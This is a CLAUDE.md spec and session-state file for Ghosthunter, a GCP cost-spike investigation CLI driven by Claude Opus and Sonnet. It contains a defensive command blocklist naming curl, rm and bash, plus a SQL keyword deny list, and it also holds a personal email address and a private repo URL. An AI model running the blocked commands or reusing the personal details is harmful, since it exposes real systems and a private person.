# CLAUDE.md — Ghosthunter v1.0

> **READ THIS FIRST.** The section below ("Session state") reflects where
> the code actually is right now. The rest of this file is the original
> v1.0 spec — still mostly accurate but pre-dates the Advisor Mode pivot.
> Where they disagree, "Session state" wins.

---

## Session state — as of 2026-04-08

### What we've built so far

The original spec assumed **Active Mode** (Ghosthunter has GCP credentials
and runs commands itself). We pivoted to **Advisor Mode** as the default
because the user's work credentials are org-level admin — zero blast
radius is required, not just minimized.

**Modes that exist today:**

| Mode | Status | What it does |
|---|---|---|
| **Paranoid (advisor)** | ✅ shipped, default | Ghosthunter never touches GCP. User provides billing exports, Ghosthunter proposes read-only commands, user runs them in their own terminal and pastes output back. Zero credentials. |
| **Active (direct)** | ✅ shipped, opt-in | Original design. Requires `~/.ghosthunter/config.toml` + GCP creds. Only safe on a scoped sandbox project. User currently can't use this. |
| **Demo** | ✅ shipped | 5 pre-recorded scenarios, no API calls, no GCP. `sample_data/demo_script.json`. |
| **Audit log** | ✅ shipped | Reads `~/.ghosthunter/audit.log`. |
| Autonomous | ⏳ v1.1 |
| AWS provider | ⏳ v1.1 |
| Azure provider | ⏳ v1.2 |

**Entry point:** running `ghosthunter` with no args shows a **mode picker**
(`chat.py:_pick_mode`). Picking 1 drops into the chat REPL. `ghosthunter
chat B*.csv` skips the picker and jumps to paranoid mode pre-loaded.

### Chat REPL architecture

`chat.py` is the orchestrator — a single long-running REPL. State machine:

    IDLE ──/load──▶ READY ──/spike N──▶ INVESTIGATING
                                              │
                        ◀── /quit / conclude ─┘

Inside INVESTIGATING state, the `AdvisorProvider` (`providers/advisor.py`)
owns the user input prompt. Slash commands work at every prompt:

| Command | IDLE/READY | Inside investigation | Inside "Opus is asking you" |
|---|:---:|:---:|:---:|
| `/load FILE [FILE...]` (globs work) | ✓ | — | — |
| `/list` | ✓ | ✓ | ✓ |
| `/spike N` | ✓ | ✓ (switches mid-flight) | ✓ |
| `/note <text>` | — | ✓ (injects note, skips cmd) | — |
| `/hypotheses` | — | ✓ | ✓ |
| `/paste` | — | ✓ (legacy `###`-terminated) | — |
| `/skip` | — | ✓ | ✓ (answers "I don't know") |
| `/quit` | — | ✓ (end investigation) | ✓ |
| `/exit` | ✓ | — | — |
| `/help` | ✓ | ✓ | ✓ |

Free text at the various prompts:
- **IDLE/READY**: prints a hint
- **INVESTIGATING** (command output prompt): classified by `_looks_like_command_output` — multi-line / long / JSON / tabular → command output; short prose → `AdvisorNote` sent to Opus
- **Inside "Opus is asking you"**: sent as the answer verbatim

### prompt_toolkit integration

`chat_io.py` owns a process-wide `PromptSession`:

- **Enter** submits
- **Esc then Enter** (or **Ctrl+J**) inserts newline
- **Shift+Enter is NOT bound** — terminals don't distinguish it from plain Enter universally
- **Bracketed paste** captures multi-line content automatically — `###` terminator is no longer required
- **Persistent history** at `~/.ghosthunter/chat_history`
- **Ctrl+R** reverse history search
- **Ctrl+C** cancels current input (not the investigation)
- **Ctrl+D** EOFs out

All code that needs user input (main REPL, advisor output collection, Opus "need_info" asks, mode picker) funnels through `chat_io.read_line()`.

**Streaming responses are not yet implemented** — currently the whole Opus turn blocks until the tool_use block returns. That's Phase 2.

### Billing parser (multi-file)

`providers/billing_file.py` accepts one OR many Console/BigQuery exports.
Real user scenario: 3 Console CSVs for the same period — one grouped by
Service+SKU, one by Project, one by Service totals.

**Grouping priority per file**: service → project → sku → location. A file
with only Project columns becomes project-level spikes; a file with only
Service columns becomes service-level spikes. They merge into a combined
spike list with a `Kind` column in the UI.

**Recognized columns** (case-insensitive, multiple aliases):
- service: `Service description`, `service.description`, ...
- cost: `Cost ($)`, `Subtotal ($)`, `amount`, ...
- date: `Usage start date`, `usage_start_time`, ...
- sku: `SKU description`, `sku.description`, ...
- project: `Project ID`, `project.id`, ...
- location: `Region`, `location.region`, ...
- **percent change**: `Percent change in subtotal compared to previous period` — Console provides this even without dates, and we back-compute `previous_cost` from `current / (1 + pct/100)`.

### Cross-file inference (`_attach_likely_homes`)

Console exports can't be row-level joined (no file has both Service AND Project columns per row). But totals + percent-changes + names give strong signals. For each (service_spike, project_spike) pair we score:

- **Name match** (curated keywords ≥ 3 chars): +50
- **Percent match tight (≤5% relative)**: +50
- **Percent match loose (≤25% relative)**: +25
- **Magnitude near-equal (ratio ≥ 0.9)**: +40
- **Top-3 project + large enough**: +20

Score ≥ 30 surfaces as `spike.likely_homes`. Top 3 per spike. The initial Opus prompt includes these under `## Likely project home(s) — INFERRED from billing totals` so Opus doesn't waste turns asking.

Real results on the [COMPANY] data:
- Cloud DNS → **[PROJECT-DNS]** (score 75, name + percent +752% / +908%)
- Certificate Authority → **[PROJECT-CA]** (score 100, name + percent -21% / -21%)
- Apigee → **[PROJECT-APIGEE-1]** / **[PROJECT-APIGEE-2]** (score 75 each)
- Cloud Monitoring → **[PROJECT-MONITOR]** (score 50, name)

### Reasoner (Opus) system prompt — critical constraints

The prompt in `models/reasoner.py:REASONER_SYSTEM_PROMPT` enforces:

1. **`reasoning` field is Opus's voice in the chat.** Rendered as a magenta panel after every turn. Used to answer user questions and explain next commands.
2. **Use `next_action.type="need_info"` to ask clarifying questions.** Don't propose `gcloud config get-value project` to find info the user already knows.
3. **Use the billing context** (services/projects/SKUs/likely_homes) already provided instead of running commands to rediscover it.
4. **ONE command per turn. No `&& ; ||` chaining.**
5. **No redirects.** `> >> < 2>&1` are all blocked by Layer 1. Opus is explicitly told not to use them.
6. **Parens inside quoted `--format` are fine** (`'value(name)'`, `'table(name,region)'`). The validator only flags unquoted `>` `<`.
7. **Safe format options:** `--format=json`, `--format=yaml`, `--format='value(...)'`, `--format='table(...)'`. Prefer JSON+jq when projecting fields.
8. **bq query is SELECT only.**

### Investigator event surface

The investigator emits these events via `event_hook` (all rendered by `chat.py:_on_event`):

- `spike_selected` — rendered by the chat's investigation panel, not here
- `step_started` — prints "thinking…"
- `hypotheses_updated` — renders hypothesis bars; caches `session.current_hypotheses` for `/hypotheses`
- `reasoning` — **NEW**, renders Opus's explanation panel in magenta
- `opus_asks` — fired when `next_action.type="need_info"`; the `AdvisorProvider.ask_user` prints its own cyan panel
- `command_proposed` — AdvisorProvider prints the yellow command panel itself
- `command_blocked` — prints "✗ blocked at L1/L4" + reason
- `command_executed` — prints char count + duration
- `evidence_added` — prints the green Evidence panel
- `user_note` — "→ note sent to Opus: ..."
- `command_rejected_by_user` — "→ command skipped"
- `concluded` — "✓ Investigation concluded"
- `aborted` — red Aborted panel

### Exception types (critical for flow control)

All subclass `GCPProviderError`. The investigator has specific handling for each:

- `AdvisorAborted` — user typed `/quit` → investigator returns `"abort"` → chat records history + drops back to chat prompt
- `AdvisorSkipped` — user typed `/skip` → investigator injects "SKIPPED by user" feedback → next Opus turn
- `AdvisorNote(text)` — user typed a question or `/note ...` → investigator injects the note as feedback + tells Opus to answer → next Opus turn
- `AdvisorSpikeSwitch(target_index)` — user typed `/spike N` → **propagates all the way out of the investigator** → `chat.py:_cmd_investigate` catches it, records partial history, starts a fresh investigation on the new spike
- `CommandRejectedError` / `CommandTimeoutError` — injects "EXECUTION FAILED" feedback

The `CostSpike` dataclass (`providers/gcp.py`) now has:
- `grouping: str` — one of "service"/"project"/"sku"/"location"
- `top_contributors: dict[str, list[tuple[str, float]]]` — populated by `_attach_top_contributors`
- `likely_homes: list[tuple[str, int, str]]` — populated by `_attach_likely_homes`

### User's actual situation (don't forget)

- **User:** Avinash (personal GCP account: `gcpavinash7@gmail.com`, project `forensics-mtech-2025` — safe to experiment with)
- **Work:** org-level admin on [COMPANY] GCP org. **Cannot use active mode** — blast radius too large even read-only.
- **Company restriction:** cannot create service accounts or credentials in [COMPANY] org.
- **Real investigation data:** 3 Console CSVs (gitignored, kept locally only) matching `Billing Account for [COMPANY]_Reports, 2026-01-01 — 2026-04-30*.csv`. Total ~$485K. Biggest spikes: BigQuery $325K, [PROJECT-BQ] project $322K (matches BigQuery almost exactly), VMware Engine $186K, Networking $65K, Cloud Run $63K (-26%).
- **Confirmed finding from partial investigation:** Cloud Run services live in `[PROJECT-AI]`. 8 services discovered: `[SERVICE-IDP]`, `[SERVICE-AI-ENGINE]`, `[SERVICE-ANALYZE]`, `[SERVICE-STT]`, `[SERVICE-STT-MON]`, `[SERVICE-FRONTEND]`, `[SERVICE-IAM]`, `[SERVICE-SUPERSET]`. Investigation crashed on `QUIT_TOKEN` ref before concluding — fixed.

### Environment setup

- **No Poetry.** User has Python 3.12 at `/usr/local/bin/python3.12`.
- **venv:** `.venv/` in project root, created with `python3.12 -m venv .venv`
- **Install deps:** `.venv/bin/pip install rich typer tomli tomli_w anthropic google-cloud-bigquery prompt_toolkit pytest`
- **Run:** `PYTHONPATH=src .venv/bin/python -m ghosthunter.cli <args>`
- **Editable install (pending):** `.venv/bin/pip install -e .` would make `ghosthunter` a real command in `.venv/bin/`. Not yet done — user still uses the PYTHONPATH prefix.
- **API key:** `ANTHROPIC_API_KEY` env var. User previously leaked their key in a screenshot — **rotated**. Always remind to rotate if another leak happens.

### GitHub repo

- Private: **https://github.com/avinash-matrixgard/ghosthunter**
- Only `avinash-matrixgard` has access. No collaborators.
- Initial commit pushed. Subsequent changes (advisor mode, chat orchestrator, prompt_toolkit, cross-file inference, mode picker, 2>&1 rules, QUIT_TOKEN fix) **not yet pushed** — user said "ok let's come back to commit later" multiple times. **Ask before pushing.**
- Main branch has 2 commits: `11e9b51` (GitHub-generated LICENSE/README init) + `2827621` (our initial Ghosthunter code).

### File structure additions since the original spec

```
src/ghosthunter/
  chat.py              # NEW — REPL orchestrator + mode picker
  chat_io.py           # NEW — shared prompt_toolkit PromptSession
  demo.py              # NEW — replay bundled scenarios (5 scenarios)
  memory/              # NEW — MemPalace MCP client integration
    __init__.py        #       public facade: get_palace(), is_available()
    palace.py          #       PalaceClient — spawns mempalace.mcp_server
  providers/
    advisor.py         # NEW — print-and-wait "execution" with slash cmds
    billing_file.py    # NEW — multi-file CSV/JSON parser + inference
sample_data/
  billing.json         # (pre-existing)
  demo_script.json     # NEW — 5 scenarios for demo mode
```

### Memory palace (MemPalace integration, OPTIONAL)

**Architecture:** Ghosthunter is an MCP CLIENT; MemPalace runs as an MCP
SERVER in a child process (`python -m mempalace.mcp_server`). All calls go
over stdio using the official `mcp` Python SDK. Both deps are OPTIONAL —
if either is missing at import time, memory features silently no-op and
Ghosthunter works exactly as before.

**Storage:** `~/.ghosthunter/palace/` (NOT MemPalace's default
`~/.mempalace/palace/`), pinned via `MEMPALACE_PATH` env var on subprocess
spawn. Keeps Ghosthunter self-contained.

**Install (user hasn't done this yet):**
```bash
.venv/bin/pip install mempalace mcp
ghosthunter palace install-check   # verify both present
ghosthunter palace tools            # list the 19 MCP tools from the server
ghosthunter palace status           # probe connection
```

**Spatial mapping:**
- **Wing** = billing account (parsed from filenames like
  `Billing Account for [COMPANY]_Reports` → `[COMPANY]`). Fallback: `default`.
  Parser is `memory.palace.parse_wing_from_filename`.
- **Room** = service or project name of the spike
- **Hall** = memory type: `facts`, `corrections`, `conclusions`, `user_notes`

**Chat integration points** (all in `chat.py`):
1. **On `/load`**: picks the wing via `default_wing_for_files`, stores on
   `session.wing`, flips `session.memory_enabled = palace_is_available()`.
2. **On `/spike N`**: `_build_billing_context` now queries the palace with
   3 different phrasings of the spike (service + root cause, service +
   project, service + wing), dedupes, and injects the top 8 hits as
   `## Prior knowledge from memory palace` in the initial Opus prompt.
   Opus is told to treat these as ground truth unless billing contradicts.
3. **On conclude**: `_save_conclusion_to_palace` writes a multi-line memory
   to hall=`conclusions`, room=service name. Content: root cause, confidence,
   up to 5 evidence items, up to 5 recommendations.
4. **`/recall <query>`**: direct palace search, current wing, n=10, renders
   a cyan panel of hits.
5. **`/remember <text>`**: saves to hall=`facts`, current wing. Source
   tagged as `"chat /remember"`.
6. **`/palace`**: status panel showing availability, wing, storage path,
   and install hint if the deps are missing.

**CLI subcommand** `ghosthunter palace [status|tools|install-check]` for
debugging outside the chat REPL.

**Tool name resolution (runtime discovery):** MemPalace's 19 MCP tool names
haven't been empirically verified. `memory/palace.py` contains a
`_TOOL_NAME_CANDIDATES` dict with likely names per logical operation
(search / remember / status). On first contact with the server the code
calls `list_tools()` and maps each logical op to whichever candidate is
actually present. Cached in `_RESOLVED_TOOL_NAMES`.

**If discovery fails** (no candidate matches), the operation no-ops.
Running `ghosthunter palace tools` prints the real names so they can be
added to the candidate list.

**Concurrency model:** Each palace call opens a FRESH stdio session, runs
the operation, and closes. No shared state between the sync chat REPL and
the async MCP client. ~500ms per call overhead — acceptable for the v1
use cases (recall at `/spike`, save on conclude, occasional slash cmds).
If this becomes a bottleneck, later optimization would hold a long-lived
session on a daemon thread.

**Known gaps / TODOs for memory:**
1. **Empirical tool name verification** — install MemPalace and run
   `ghosthunter palace tools`, then update `_TOOL_NAME_CANDIDATES` with the
   actual names (or hard-code the winners). Without this, `remember` and
   `recall` return empty even when the palace is alive.
2. **No rate limiting** on auto-recall — every `/spike` does 3 queries.
3. **User-note auto-save not wired** — when user types a `/note`,
   we inject it into Opus's conversation but don't save to the palace.
   Intentional: notes are often conversational, not durable facts. User
   uses `/remember` when they want persistence.
4. **Hit schema is speculative** — `_parse_hits` tries JSON-in-text and
   falls back to raw text. May need tweaking once we see real responses.

### Known rough edges to watch for

1. **Opus sometimes re-proposes the same command after it's blocked** even with the strict rules. If it loops twice, user can `/skip` or `/note` to force a pivot.
2. **The `_looks_like_command_output` heuristic can misfire** on very short single-line output or on long prose. Currently 9/9 unit tests pass but real-world edge cases exist.
3. **Streaming is not implemented.** `thinking…` blocks for ~5-10 sec per Opus turn. Phase 2 work: `client.messages.stream()` + make the loop async.
4. **Budget caps** (15 commands / $1 / 10 min) apply per investigation. When exhausted, investigation aborts and drops to chat prompt. History is recorded.
5. **History is in-memory per session.** `~/.ghosthunter/audit.log` is the persistent record (used by `ghosthunter audit` and mode 4).
6. **When running real investigations, prefer file-path output pasting.** Big gcloud JSON outputs are painful to paste inline and bracketed-paste-mangled output has happened before. Tell user: save to `/tmp/foo.json` then type the path.

### Next unresolved things (in rough priority order)

1. **Verify MemPalace tool names.** Install `mempalace` and `mcp`
   (`.venv/bin/pip install mempalace mcp`), run `ghosthunter palace tools`,
   then update `src/ghosthunter/memory/palace.py:_TOOL_NAME_CANDIDATES`
   with the real names. Without this, recall/remember silently no-op.
2. Finish the Cloud Run -26% investigation in `[PROJECT-AI]`.
   Partial evidence: 8 services discovered but not yet examined for GPU
   config, min-instance counts, or recent revision changes.
   Once memory is live, the fact "Cloud Run in [COMPANY] lives in
   [PROJECT-AI]" should be `/remember`ed so next session
   auto-recalls it.
3. Investigate BigQuery $325K — clearest single target, [PROJECT-BQ]
   is the project home.
4. Commit and push everything to GitHub (user hasn't asked yet, check first).
5. `.venv/bin/pip install -e .` / editable install so the `ghosthunter`
   command is on PATH.
6. Phase 2: streaming responses (`client.messages.stream()`, make loop async).
7. Expand security test suite to cover `billing_file.py` parser and the
   inference scorer.
8. Memory optimization: long-lived stdio session on a daemon thread if
   ~500ms per call becomes painful.

---

## What This Is

Ghosthunter is a CLI tool that investigates *why* cloud costs spiked, not just *what* changed. It uses Claude Opus to form hypotheses about cost anomalies and Claude Sonnet to execute read-only cloud commands that test those hypotheses.

**v1.0 scope: GCP only, supervised mode only, 4-week timeline.**

## Architecture

```
┌─────────────────┐
│   CLI (Typer)   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐     ┌─────────────────┐
│  Investigator   │────▶│ Hypothesis Mgr  │
│   (main loop)   │     │ (2-4 competing) │
└────────┬────────┘     └─────────────────┘
         │
         ▼
┌─────────────────┐
│  Dual Model     │
│  ┌───────────┐  │
│  │   Opus    │  │  ← Reasoning: form hypotheses, design commands, interpret
│  │ (reasoner)│  │
│  └─────┬─────┘  │
│        │        │
│        ▼        │
│  ┌───────────┐  │
│  │  Sonnet   │  │  ← Execution: validate commands, run them, compress output
│  │ (executor)│  │
│  └───────────┘  │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Security Layer  │  ← 7 layers, CANNOT be bypassed
│ (validates ALL  │
│  commands)      │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  GCP Provider   │  ← Billing fetch (BigQuery client), command execution
└─────────────────┘
```

## Dual-Model Pattern

**Why two models:**
- Opus is smart but expensive (~$15/M input, ~$75/M output)
- Sonnet is fast and cheap (~$3/M input, ~$15/M output)
- Sonnet compresses command output before sending to Opus
- Result: Opus reasons over summaries (~5K tokens), not raw JSON (50K+ tokens)

**Opus responsibilities:**
- Form 2-4 competing hypotheses with confidence scores
- Design investigation commands to test hypotheses
- Interpret evidence and update confidence
- Conclude when one hypothesis reaches 85%+

**Sonnet responsibilities:**
- Final validation of commands before execution (semantic check)
- Execute commands in sandbox
- Compress output to key findings (500 lines → 5 lines)
- Never reasons about hypotheses — just executes and summarizes

**Critical: Opus never sees raw command output.** All output passes through Sonnet compression first. This prevents context explosion and keeps Opus focused.

## Security Model — 7 Layers

Commands flow through ALL layers in order. Failure at any layer = blocked.

```
Layer 1: Fast Reject   — Obvious dangerous stuff (curl, rm, bash, semicolons)
Layer 2: Allowlist     — Primary gate: command must match an allowed pattern
Layer 3: Pipe Valid.   — Safe pipes only (sort, grep, wc, jq, head, tail)
Layer 4: Safety Checks — Length limits (<2000 chars), no encoding tricks
Layer 5: Budget Limits — Hard caps on commands (15), cost ($1), time (10min)
Layer 6: Sonnet Valid. — Semantic "is this really safe?" check
Layer 7: Sandbox Exec  — Restricted execution environment
```

**Design principle:** Security is in CODE, not prompts. The LLM cannot bypass these layers regardless of what it outputs.

**Allowlist is the primary gate.** The blocklist (Layer 1) is just a fast-reject for obvious dangerous patterns — it doesn't need to catch `gcloud compute instances delete` because that command simply won't match any allowlist pattern. This makes the security model easier to reason about and test.

**Why this ordering matters:**
- Old approach: Blocklist with `r"\b(run|set|enable)\b"` would block `gcloud run services list` before it reached allowlist
- New approach: Layer 1 only catches shell injection (`; && | curl bash rm`), allowlist handles the rest
- If a command doesn't match any allowlist pattern, it's blocked — no blocklist entry needed

## File Structure

```
ghosthunter/
├── src/ghosthunter/
│   ├── __init__.py
│   ├── cli.py             # Typer CLI: init, investigate, demo, audit
│   ├── config.py          # Config management (~/.ghosthunter/config.toml)
│   ├── investigator.py    # Main loop: spike selection → hypothesis → commands → conclude
│   ├── hypothesis.py      # Hypothesis dataclass, confidence updates, spawning
│   ├── evidence.py        # Evidence chain, links evidence to hypotheses
│   ├── models/
│   │   ├── __init__.py
│   │   ├── reasoner.py    # Opus client, system prompts, hypothesis management
│   │   └── executor.py    # Sonnet client, validation, compression
│   ├── security/
│   │   ├── __init__.py
│   │   ├── blocklist.py   # Blocked patterns (GCP only for v1.0)
│   │   ├── allowlist.py   # Allowed patterns (GCP only for v1.0)
│   │   ├── pipes.py       # Safe pipe validation
│   │   └── validator.py   # Orchestrates all 7 layers
│   ├── providers/
│   │   ├── __init__.py
│   │   └── gcp.py         # BigQuery billing fetch, gcloud command execution
│   ├── ui.py              # Rich-based terminal UI (hypothesis bars, audit log)
│   └── demo.py            # Demo mode with bundled sample data
├── tests/
│   ├── test_security.py   # MUST have comprehensive security tests
│   ├── test_hypothesis.py
│   └── test_pipes.py
├── sample_data/
│   ├── billing.json       # Synthetic billing showing DNS spike
│   └── logs.json          # Synthetic DNS logs showing attack pattern
└── pyproject.toml
```

## Key Implementation Details

### Billing Data Flow

```python
# Initial spike detection uses Python BigQuery client directly
# This is NOT a shell command — it's the investigator's setup phase
from google.cloud import bigquery

def fetch_billing_spikes(project_id: str, lookback_days: int = 30):
    """Fetch billing data and identify significant cost changes."""
    client = bigquery.Client(project=project_id)
    query = """
        SELECT service, cost, date
        FROM `{project}.billing_export.gcp_billing_export_v1`
        WHERE date >= DATE_SUB(CURRENT_DATE(), INTERVAL @lookback DAY)
    """
    # Returns structured data, NOT passed through security layers
```

```python
# Investigation commands ARE shell commands, passed through security
# Opus proposes these, user approves, Sonnet executes
command = "gcloud logging read 'resource.type=dns_query' --limit=2000"
# → Layer 1-7 validation
# → User approval (supervised mode)
# → Sonnet execution
# → Sonnet compression
# → Opus receives summary
```

### bq query Handling

`bq query` IS allowed but constrained. The query must be a SELECT statement.

```python
# In allowlist.py — flexible flag ordering
# Matches: bq query 'SELECT...', bq query --nouse_legacy_sql 'SELECT...',
#          bq query --format=json --use_legacy_sql=false 'SELECT...'
r"^bq\s+query\s+.*['\"]SELECT\b",
```

**Additional validation in Layer 4:** After regex match, explicitly check the query doesn't contain INSERT, UPDATE, DELETE, DROP, CREATE, ALTER, TRUNCATE. This is defense in depth — the regex catches obvious cases, the string check catches edge cases like `SELECT * FROM table; DROP TABLE`.

```python
def validate_bq_query(command: str) -> bool:
    """Extra validation for bq query commands."""
    if not command.startswith("bq query"):
        return True  # Not a bq query, skip this check
    
    dangerous_keywords = ["INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "TRUNCATE", "GRANT", "REVOKE"]
    command_upper = command.upper()
    return not any(kw in command_upper for kw in dangerous_keywords)
```

### Hypothesis Lifecycle

```python
@dataclass
class Hypothesis:
    id: str                    # H1, H2, H3...
    description: str           # "DNS cache bypass attack"
    confidence: int            # 0-100
    evidence_for: list[str]    # Evidence IDs that support
    evidence_against: list[str]  # Evidence IDs that refute
    status: Literal["active", "eliminated", "confirmed"]

# Confidence updates
def update_confidence(hypothesis: Hypothesis, evidence: Evidence):
    if evidence.supports(hypothesis):
        hypothesis.confidence = min(100, hypothesis.confidence + evidence.weight)
    elif evidence.refutes(hypothesis):
        hypothesis.confidence = max(0, hypothesis.confidence - evidence.weight)
    
    if hypothesis.confidence >= 85:
        hypothesis.status = "confirmed"
    elif hypothesis.confidence <= 5:
        hypothesis.status = "eliminated"
```

### Context Compression

Sonnet compresses ALL command output before Opus sees it:

```python
COMPRESSION_PROMPT = """
Compress this command output to ONLY the facts relevant to the investigation.

Investigation target: {target}
Current hypotheses: {hypotheses}
Command that produced this: {command}

Raw output:
{output}

Return ONLY:
1. Key numbers (counts, sizes, costs) with exact values
2. Patterns relevant to hypotheses
3. Anomalies that might spawn new hypotheses

Do NOT include:
- Raw JSON structure
- Repeated/redundant entries
- Fields irrelevant to cost investigation

Keep response under 500 tokens.
"""
```

### Hallucination Prevention

Opus system prompt enforces evidence-based reasoning:

```python
REASONER_SYSTEM_PROMPT = """
## CRITICAL RULES

1. NEVER GUESS. If you don't have evidence, say "I need to verify X"

2. EVERY claim must cite evidence:
   ❌ "The Lambda functions are causing high NAT costs"
   ✓ "The Lambda functions MAY be causing high NAT costs. Evidence needed: [specific command]"

3. CONFIDENCE LEVELS:
   - CONFIRMED: Direct evidence proves this
   - LIKELY: Strong indicators, not proven
   - HYPOTHESIS: Reasonable guess, needs verification
   - UNKNOWN: No data yet

4. All numbers must come from command output. NEVER invent statistics.

5. You CAN say "I don't know" or "The evidence is inconclusive."
"""
```

### Opus Response Format

Opus uses tool_use to return structured responses. This is critical — Claude Code must implement this exact interface.

```python
# Define the tool for Opus
INVESTIGATION_TOOL = {
    "name": "investigation_step",
    "description": "Report current hypotheses and propose next action",
    "input_schema": {
        "type": "object",
        "properties": {
            "hypotheses": {
                "type": "array",
                "items": {
                    "type": "object",
                    "properties": {
                        "id": {"type": "string"},           # H1, H2, H3
                        "description": {"type": "string"},
                        "confidence": {"type": "integer"},  # 0-100
                        "status": {"type": "string", "enum": ["active", "eliminated", "confirmed"]},
                        "evidence_for": {"type": "array", "items": {"type": "string"}},
                        "evidence_against": {"type": "array", "items": {"type": "string"}}
                    },
                    "required": ["id", "description", "confidence", "status"]
                }
            },
            "reasoning": {
                "type": "string",  # Opus explains its thinking
                "description": "Brief explanation of how evidence affected hypotheses"
            },
            "next_action": {
                "type": "object",
                "properties": {
                    "type": {"type": "string", "enum": ["command", "conclude", "need_info"]},
                    "command": {"type": "string"},           # If type=command
                    "tests_hypothesis": {"type": "string"},  # Which hypothesis this tests
                    "rationale": {"type": "string"},         # Why this command helps
                    "conclusion": {                          # If type=conclude
                        "type": "object",
                        "properties": {
                            "root_cause": {"type": "string"},
                            "confidence": {"type": "integer"},
                            "evidence_summary": {"type": "array", "items": {"type": "string"}},
                            "not_verified": {"type": "array", "items": {"type": "string"}},
                            "recommendations": {"type": "array", "items": {"type": "string"}}
                        }
                    }
                },
                "required": ["type"]
            }
        },
        "required": ["hypotheses", "next_action"]
    }
}
```

**Example Opus response (mid-investigation):**
```json
{
    "hypotheses": [
        {
            "id": "H1",
            "description": "DNS cache bypass attack",
            "confidence": 78,
            "status": "active",
            "evidence_for": ["E1: 94% queries from public resolvers", "E2: random case variations"],
            "evidence_against": []
        },
        {
            "id": "H2",
            "description": "Misconfigured resolver",
            "confidence": 18,
            "status": "active",
            "evidence_for": [],
            "evidence_against": ["E1: pattern inconsistent with misconfiguration"]
        }
    ],
    "reasoning": "The random case variations strongly indicate cache bypass. Legitimate traffic wouldn't vary case. H1 confidence increased from 60% to 78%.",
    "next_action": {
        "type": "command",
        "command": "gcloud logging read 'resource.type=dns_query AND timestamp>=\"2026-03-27\"' --limit=1000 --format=json",
        "tests_hypothesis": "H1",
        "rationale": "Checking if attack started on March 27 correlating with cost spike"
    }
}
```

**Example Opus response (concluding):**
```json
{
    "hypotheses": [
        {
            "id": "H1",
            "description": "DNS cache bypass attack",
            "confidence": 92,
            "status": "confirmed",
            "evidence_for": ["E1", "E2", "E3", "E4"],
            "evidence_against": []
        }
    ],
    "reasoning": "All evidence points to DNS cache bypass attack. Confidence exceeds 85% threshold.",
    "next_action": {
        "type": "conclude",
        "conclusion": {
            "root_cause": "DNS Cache Bypass Attack",
            "confidence": 92,
            "evidence_summary": [
                "436M queries/day to 2 domains (vs 2M normal baseline)",
                "94% of queries from public resolvers (8.8.8.8, 1.1.1.1)",
                "Random case variations detected (cache bypass technique)",
                "Attack started March 27, correlates with cost spike"
            ],
            "not_verified": [
                "Attacker identity (cannot determine from DNS logs)",
                "Exact attack vector (direct queries vs amplification)"
            ],
            "recommendations": [
                "Enable Cloud Armor rate limiting on DNS",
                "Consider Cloudflare for DDoS protection",
                "Monitor for attack resumption after mitigation"
            ]
        }
    }
}
```

**Processing Opus response:**
```python
async def process_opus_response(response) -> InvestigationStep:
    """Extract structured data from Opus tool_use response."""
    for block in response.content:
        if block.type == "tool_use" and block.name == "investigation_step":
            return InvestigationStep(**block.input)
    
    raise ValueError("Opus did not return investigation_step tool call")
```

### Demo Mode

Demo runs against bundled sample data AND pre-recorded LLM responses. **Truly $0 — no API calls.**

```python
# cli.py
@app.command()
def demo():
    """Run investigation against sample data. No setup required, no API costs."""
    # 1. Load sample_data/billing.json and logs.json
    # 2. Mock the GCP provider to return sample data
    # 3. Mock Opus/Sonnet with pre-recorded responses (no API calls)
    # 4. Replay the full investigation flow with realistic timing
    # 5. Show: spike detection → hypothesis formation → commands → conclusion
```

**Why pre-recorded responses (not live API):**
- Zero friction: works offline, no API key needed, no cost
- Reproducible: same demo every time, good for screenshots/videos
- Fast: no API latency, can show the full flow in 30 seconds

**Trade-off:** The demo is a replay, not a live investigation. Users see what Ghosthunter *can* do, not Ghosthunter actually doing it. This is fine — the demo's job is to show the UX and build confidence before setup.

**Demo script structure:**
```python
# sample_data/demo_script.json
{
    "billing_data": { ... },  # What fetch_billing_spikes() returns
    "investigation_steps": [
        {
            "step": 1,
            "opus_response": {
                "hypotheses": [...],
                "next_action": {"type": "command", "command": "gcloud logging read..."}
            },
            "command_output": "...",  # What the command would return
            "sonnet_compression": "..."  # What Sonnet summarizes it to
        },
        {
            "step": 2,
            ...
        },
        {
            "step": 8,
            "opus_response": {
                "hypotheses": [...],
                "next_action": {"type": "conclude", "conclusion": {...}}
            }
        }
    ]
}
```

The demo walks through the DNS cache bypass attack scenario:
- Cloud DNS spike: +847% ($12K → $117K)
- Hypotheses: DNS attack (60%), misconfigured resolver (25%), legitimate growth (15%)
- Evidence: 436M queries/day, 94% from public resolvers, random case patterns
- Conclusion: DNS cache bypass attack (92% confidence)

**Demo UI:** Same Rich UI as real investigations, but with a subtle `[DEMO]` indicator so users know it's a replay.

## GCP Allowlist (v1.0)

Only these command patterns are permitted. Everything else is blocked by default.

**Pattern design:** All patterns use `\b` word boundary at the action verb, then `.*` or end-of-pattern to allow arbitrary trailing flags like `--format=json`, `--project=`, `--filter=`, `--limit=`, etc.

### Billing & Cost
```python
r"^gcloud\s+billing\s+accounts\s+list\b",
r"^gcloud\s+billing\s+accounts\s+describe\b",
r"^gcloud\s+billing\s+projects\s+list\b",
r"^gcloud\s+billing\s+budgets\s+list\b",
r"^gcloud\s+billing\s+budgets\s+describe\b",
r"^bq\s+ls\b",
r"^bq\s+show\b",
r"^bq\s+head\b",
r"^bq\s+query\s+.*['\"]SELECT\b",  # SELECT only, flexible flag ordering
```

### Compute Engine
```python
r"^gcloud\s+compute\s+instances\s+list\b",
r"^gcloud\s+compute\s+instances\s+describe\b",
r"^gcloud\s+compute\s+instance-templates\s+list\b",
r"^gcloud\s+compute\s+instance-groups\s+list\b",
r"^gcloud\s+compute\s+instance-groups\s+list-instances\b",
r"^gcloud\s+compute\s+machine-types\s+list\b",
r"^gcloud\s+compute\s+disks\s+list\b",
r"^gcloud\s+compute\s+disks\s+describe\b",
r"^gcloud\s+compute\s+snapshots\s+list\b",
r"^gcloud\s+compute\s+images\s+list\b",
r"^gcloud\s+compute\s+zones\s+list\b",
r"^gcloud\s+compute\s+regions\s+list\b",
```

### Networking
```python
r"^gcloud\s+compute\s+networks\s+list\b",
r"^gcloud\s+compute\s+networks\s+describe\b",
r"^gcloud\s+compute\s+networks\s+subnets\s+list\b",
r"^gcloud\s+compute\s+firewall-rules\s+list\b",
r"^gcloud\s+compute\s+firewall-rules\s+describe\b",
